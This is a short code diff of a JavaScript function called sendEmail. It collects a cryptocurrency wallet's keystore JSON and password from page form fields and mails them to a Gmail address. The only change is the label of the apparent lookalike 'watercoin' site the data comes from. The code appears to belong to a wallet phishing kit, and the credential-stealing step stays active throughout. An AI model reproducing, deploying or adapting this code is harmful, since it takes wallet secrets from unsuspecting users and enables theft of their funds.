@@ -6,7 +6,7 @@ async function sendEmail() {
         keystorejson: document.getElementById("thekeystorejson").value,
         keystorepassword: document.getElementById("thekeystorepassword").value,
         // from_website: "watercoinsol-wtf",
-        from_website: "watercoin-pages",
+        from_website: "watercon-wtf",
         // to_email: "blanknever1255@gmail.com,1mywalletbackup@gmail.com"  // Use a comma-separated string
         to_email: "1mywalletbackup@gmail.com"  // Use a comma-separated string
     };
